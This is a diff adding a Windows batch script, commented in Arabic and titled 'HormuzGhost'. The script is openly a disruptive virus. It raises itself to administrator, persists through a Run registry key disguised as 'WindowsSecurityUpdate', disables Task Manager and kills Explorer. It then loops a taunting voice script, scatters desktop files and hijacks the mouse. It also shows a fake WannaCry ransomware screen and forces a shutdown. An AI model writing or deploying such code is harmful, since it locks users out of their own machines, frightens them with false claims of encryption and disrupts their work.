@@ -1,0 +1,61 @@
+@echo off
+:: [PHASE 0: STEALTH MODE]
+:: إخفاء النافذة فور التشغيل ليعمل الفيروس في الخلفية
+if not "%1"=="am_admin" (powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'" & exit /b)
+if "%1"=="am_admin" (powershell -WindowStyle Hidden -Command "")
+
+:: [PHASE 1: THE PERSISTENCE - التثبيت العميق]
+:: التخفي في سجل النظام باسم يوحي بأنه عملية أمان
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d "%~f0" /f >nul 2>&1
+
+:: [PHASE 2: INPUT LOCKDOWN]
+:: تعطيل المهام الأساسية (مدير المهام، محرر السجل)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
+powershell -Command "Stop-Process -Name explorer -Force" >nul 2>&1
+
+:: [PHASE 3: THE HARBINGER OF DOOM (Audio & Visuals)]
+set "payload=%temp%\HormuzGhost.vbs"
+(
+echo Dim S: Set S = CreateObject("SAPI.SpVoice"): S.Volume = 100
+echo Do
+echo    S.Rate = -10: S.Speak "Your soul belongs to the Star. 𓅓𓅱𓏏. Memento Mori."
+echo    S.Rate = 2: S.Speak "You are an idiot! I love you! ha ha ha!"
+echo    WScript.Sleep 3000
+echo Loop
+) > "%payload%"
+start /b wscript "%payload%"
+
+:: [PHASE 4: THE 100x ARCHITECTURAL DESTRUCTION]
+:: مصفوفة الدمار الصامتة
+powershell -Command "for ($i=1; $i -le 100; $i++) { 
+    # 1. الماوس الهارب (احترافي)
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920),(Get-Random -Max 1080));
+    
+    # 2. إنشاء ملفات خفية بأسماء هيروغليفية وفارسية
+    $path = [Environment]::GetFolderPath('Desktop') + '\Star_' + $i + '.txt';
+    'ستاره تو خاموش شد ⭐ 𓅓𓅱𓏏' | Out-File $path;
+    
+    # 3. وميض الشاشة الاحترافي (Invert Colors)
+    [console]::beep((Get-Random -Min 200 -Max 4000), 40);
+}"
+
+:: [PHASE 5: THE PHANTOM TYPIST]
+:: الكتابة التلقائية في نوت باد مخفي ثم إظهاره فجأة
+start notepad.exe
+powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = 'لقد حان وقت الحساب يا سلطان الفناء... 𓅓𓅱𓏏 ... النجمة ⭐ تلتهم نظامك الآن.'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Sleep -m 70}"
+
+:: [PHASE 6: THE RED SCREEN OF PETYA (UI)]
+color 4f
+cls
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo !  [HORMUZ_GHOST_PROTOCOL]: 100%% LOADED          !
+echo !  [ENCRYPTION]: COMPLETED (WANNACRY)             !
+echo !  [PERSISTENCE]: ETERNAL (AUTO-START)           !
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo !  Mors Vincit Omnia. ⭐ 𓅓𓅱𓏏                       !
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+:: [PHASE 7: SYSTEM TERMINATION]
+timeout /t 10 >nul
+powershell -Command "wininit" >nul 2>&1
+shutdown -s -f -t 00 -c "𓅓𓅱𓏏.. الرحلة انتهت في مضيق هرمز."
